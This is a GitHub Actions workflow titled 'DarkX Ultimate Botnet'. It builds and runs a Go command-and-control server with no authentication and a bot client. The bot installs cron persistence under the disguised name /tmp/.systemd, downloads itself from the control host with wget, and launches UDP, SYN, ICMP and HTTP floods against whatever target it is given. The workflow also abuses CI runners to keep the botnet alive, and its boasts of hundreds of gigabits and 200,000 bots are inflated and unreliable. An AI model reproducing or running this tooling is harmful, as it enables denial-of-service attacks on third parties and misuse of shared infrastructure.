name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd
        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
        pip3 install requests paramiko scapy cryptography colorama

    - name: Install Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Create Fixed CNC Server
      run: |
        cd darkx
        cat > cnc_server.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "os"
            "strings"
            "sync"
        )
        
        type Bot struct {
            Conn net.Conn
            IP   string
        }
        
        var (
            bots     []Bot
            botMutex sync.Mutex
        )
        
        func main() {
            fmt.Println("DarkX Ultimate CNC - NO AUTH - READY")
            port := getEnv("CNC_PORT", "5555")
            listener, err := net.Listen("tcp", ":"+port)
            if err != nil {
                fmt.Printf("Failed to start CNC: %v\n", err)
                return
            }
            fmt.Printf("CNC Listening on :%s\n", port)
            
            for {
                conn, err := listener.Accept()
                if err != nil {
                    continue
                }
                go handleConnection(conn)
            }
        }
        
        func handleConnection(conn net.Conn) {
            defer conn.Close()
            reader := bufio.NewReader(conn)
            
            // Add bot
            bot := Bot{
                Conn: conn,
                IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
            }
            
            botMutex.Lock()
            bots = append(bots, bot)
            botCount := len(bots)
            botMutex.Unlock()
            
            fmt.Printf("New bot: %s (Total: %d)\n", bot.IP, botCount)
            conn.Write([]byte(fmt.Sprintf("Connected to DarkX CNC. Bots: %d\n", botCount)))
            
            // Handle commands from user
            for {
                conn.Write([]byte("darkx> "))
                cmd, err := reader.ReadString('\n')
                if err != nil {
                    break
                }
                cmd = strings.TrimSpace(cmd)
                
                if cmd == "bots" {
                    botMutex.Lock()
                    conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
                    botMutex.Unlock()
                } else if strings.HasPrefix(cmd, "attack") {
                    parts := strings.Split(cmd, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        
                        botMutex.Lock()
                        attackCount := len(bots)
                        for _, bot := range bots {
                            bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s\n", target, port, duration)))
                        }
                        botMutex.Unlock()
                        conn.Write([]byte(fmt.Sprintf("Attack launched on %s:%s with %d bots\n", target, port, attackCount)))
                    } else {
                        conn.Write([]byte("Usage: attack <target> <port> <duration>\n"))
                    }
                } else if cmd == "help" {
                    conn.Write([]byte("Commands: bots, attack <target> <port> <duration>, help, exit\n"))
                } else if cmd == "exit" {
                    conn.Write([]byte("Goodbye!\n"))
                    return
                } else {
                    conn.Write([]byte("Unknown command. Type 'help' for help.\n"))
                }
            }
            
            // Remove disconnected bot
            botMutex.Lock()
            for i, b := range bots {
                if b.Conn == conn {
                    bots = append(bots[:i], bots[i+1:]...)
                    break
                }
            }
            botMutex.Unlock()
            fmt.Printf("Bot disconnected: %s\n", bot.IP)
        }
        
        func getEnv(key, fallback string) string {
            if value := os.Getenv(key); value != "" {
                return value
            }
            return fallback
        }
        EOF

    - name: Create Fixed Bot Client
      run: |
        cd darkx
        cat > bot_client.go << 'EOF'
        package main
        
        import (
            "bufio"
            "fmt"
            "net"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )
        
        var (
            CNC_SERVER = "CNC_IP_PLACEHOLDER"
            CNC_PORT   = "5555"
        )
        
        func main() {
            // Install persistence
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
                exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
            }
            
            for {
                if connectToCNC() {
                    time.Sleep(30 * time.Second)
                } else {
                    time.Sleep(60 * time.Second)
                }
            }
        }
        
        func connectToCNC() bool {
            conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
            if err != nil {
                return false
            }
            defer conn.Close()
            
            // Send initial connection message
            conn.Write([]byte("BOT_CONNECTED\n"))
            
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                line := scanner.Text()
                
                if strings.HasPrefix(line, "ATTACK") {
                    parts := strings.Split(line, " ")
                    if len(parts) >= 4 {
                        target := parts[1]
                        port := parts[2]
                        duration := parts[3]
                        fmt.Printf("Received attack command: %s %s %s\n", target, port, duration)
                        go executeAttack(target, port, duration)
                    }
                } else if strings.Contains(line, "Connected to DarkX CNC") {
                    fmt.Println("Successfully connected to CNC")
                }
            }
            return true
        }
        
        func executeAttack(target, port, duration string) {
            fmt.Printf("🚀 Executing attack on %s:%s for %s\n", target, port, duration)
            
            // Launch multiple attack methods simultaneously
            go launchUDPFlood(target, port, duration)
            go launchSYNFlood(target, port, duration)
            go launchHTTPFlood(target, port, duration)
            go launchICMPFlood(target, duration)
        }
        
        func launchUDPFlood(target, port, duration string) {
            fmt.Printf("🔥 UDP Flood: %s:%s\n", target, port)
            cmd := exec.Command("timeout", duration, "hping3", "--udp", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchSYNFlood(target, port, duration string) {
            fmt.Printf("🌊 SYN Flood: %s:%s\n", target, port)
            cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
            cmd.Start()
        }
        
        func launchHTTPFlood(target, port, duration string) {
            fmt.Printf("📡 HTTP Flood: %s:%s\n", target, port)
            go func() {
                endTime := time.Now().Add(parseDuration(duration))
                for time.Now().Before(endTime) {
                    exec.Command("curl", "-s", "--max-time", "2", fmt.Sprintf("http://%s:%s", target, port)).Run()
                    time.Sleep(100 * time.Millisecond)
                }
            }()
        }
        
        func launchICMPFlood(target, duration string) {
            fmt.Printf("💥 ICMP Flood: %s\n", target)
            cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
            cmd.Start()
        }
        
        func parseDuration(dur string) time.Duration {
            if strings.HasSuffix(dur, "s") {
                sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
                return time.Duration(sec) * time.Second
            } else if strings.HasSuffix(dur, "m") {
                min, _ := strconv.Atoi(strings.TrimSuffix(dur, "m"))
                return time.Duration(min) * time.Minute
            } else if strings.HasSuffix(dur, "h") {
                hours, _ := strconv.Atoi(strings.TrimSuffix(dur, "h"))
                return time.Duration(hours) * time.Hour
            }
            // Default to 60 seconds if no suffix
            sec, _ := strconv.Atoi(dur)
            return time.Duration(sec) * time.Second
        }
        EOF

    - name: Build Fixed Components
      run: |
        cd darkx
        echo "Building DarkX components..."
        
        # Build CNC first
        go build -o cnc cnc_server.go
        echo "CNC built successfully"
        
        # Update bot client with real IP and build
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot_client.go
        go build -o bot bot_client.go
        echo "Bot client built successfully"
        
        echo "All components built successfully"

    - name: Deploy Initial Botnet
      run: |
        cd darkx
        echo "Starting CNC server..."
        nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        # Start initial bots
        echo "Deploying initial bots..."
        for i in {1..200}; do
          nohup ./bot >/dev/null 2>&1 &
        done
        echo "Initial bots deployed"
        sleep 5

    - name: Start File Server
      run: |
        cd darkx
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        sleep 3

    - name: Create Mass Bot Deployer
      run: |
        cd darkx
        cat > deploy_bots.sh << 'EOF'
        #!/bin/bash
        
        CNC_IP="${{ env.CNC_IP }}"
        
        deploy_bot() {
            local bot_id=$1
            
            # Download and run bot
            wget -q http://$CNC_IP:8000/bot -O /tmp/.systemd
            chmod +x /tmp/.systemd
            nohup /tmp/.systemd >/dev/null 2>&1 &
            
            # Persistence
            (crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd") | crontab -
            
            echo "Deployed bot: $bot_id"
        }
        
        # Mass deployment based on power level
        case "${{ github.event.inputs.power }}" in
            "100mb") COUNT=2000 ;;
            "1gb") COUNT=10000 ;;
            "10gb") COUNT=40000 ;;
            "100gb") COUNT=100000 ;;
            "1tb") COUNT=200000 ;;
        esac
        
        echo "🤖 Deploying $COUNT bots..."
        
        for i in $(seq 1 $COUNT); do
            deploy_bot $i &
            
            # Rate limiting
            if [ $((i % 500)) -eq 0 ]; then
                sleep 2
                echo "✅ Deployed $i/$COUNT bots"
            fi
        done
        
        wait
        echo "🎯 All $COUNT bots deployed successfully"
        EOF
        
        chmod +x deploy_bots.sh

    - name: Mass Deploy Bots
      run: |
        cd darkx
        echo "🚀 Starting massive bot deployment..."
        
        # Run deployment in background
        nohup ./deploy_bots.sh > deployment.log 2>&1 &
        echo "DEPLOY_PID=$!" >> $GITHUB_ENV
        
        # Show progress
        sleep 10
        echo "🔄 Deployment in progress..."
        
        # Monitor deployment for a while
        for i in {1..20}; do
            if ps -p $DEPLOY_PID > /dev/null 2>&1; then
                CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
                TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
                echo "📊 Connected: $CONNECTED_BOTS, Total: $TOTAL_PROCESSES"
                sleep 10
            else
                break
            fi
        done

    - name: Display Working Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "🔥 NO AUTHENTICATION REQUIRED"
        echo "💪 Power Level:    ${{ github.event.inputs.power }}"
        echo "🔄 Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "🌐 DarkX CNC:      ${{ env.CNC_IP }}:5555"
        echo "🚀 Bot Deployment: ACTIVE"
        echo "💥 Target Power:   400+ Gbps"
        echo "=========================================="
        echo "📡 Connect: nc ${{ env.CNC_IP }} 5555"
        echo "💻 Commands:"
        echo "   bots - Show connected bots"
        echo "   attack <target> <port> <duration>"
        echo "   help - Show commands"
        echo "   exit - Disconnect"
        echo ""
        echo "Example: attack 1.1.1.1 80 60s"
        echo "=========================================="
        echo ""

    - name: Maintain Botnet & Show Stats (Fixed Path)
      run: |
        echo "🛡️ DarkX Ultimate Active - Maintaining Massive Botnet"
        
        # Store current directory
        WORKSPACE="$GITHUB_WORKSPACE"
        DARKX_DIR="$WORKSPACE/darkx"
        
        # Start continuous deployment
        cd "$DARKX_DIR"
        nohup bash -c 'while true; do ./deploy_bots.sh; sleep 300; done' > continuous_deploy.log 2>&1 &
        CONTINUOUS_PID=$!
        
        while true; do
          # Check services using absolute paths
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "🔄 Restarting CNC Server..."
            cd "$DARKX_DIR"
            nohup ./cnc > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          
          if ! ps -p $HTTP_PID > /dev/null 2>&1; then
            echo "🔄 Restarting HTTP Server..."
            cd "$DARKX_DIR"
            python3 -m http.server 8000 > http_restart.log 2>&1 &
            HTTP_PID=$!
          fi
          
          # Show real-time stats
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
          TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
          ESTIMATED_POWER=$((CONNECTED_BOTS * 500))  # 500 Mbps per bot
          
          echo "[$(date +'%H:%M:%S')] Stats:"
          echo "  🤖 Connected Bots: $CONNECTED_BOTS"
          echo "  📊 Total Processes: $TOTAL_PROCESSES"
          echo "  ⚡ Estimated Power: $ESTIMATED_POWER Mbps"
          echo "  🌐 CNC Status: ACTIVE"
          
          # Auto-scale if needed
          if [ $CONNECTED_BOTS -lt 1000 ]; then
            echo "➕ Auto-scaling bot deployment..."
            cd "$DARKX_DIR"
            for i in {1..1000}; do
              nohup ./bot >/dev/null 2>&1 &
            done
          fi
          
          # Show recent connections
          if [ $CONNECTED_BOTS -gt 0 ]; then
            echo "  🔗 Recent connections established"
          fi
          
          sleep 30
        done
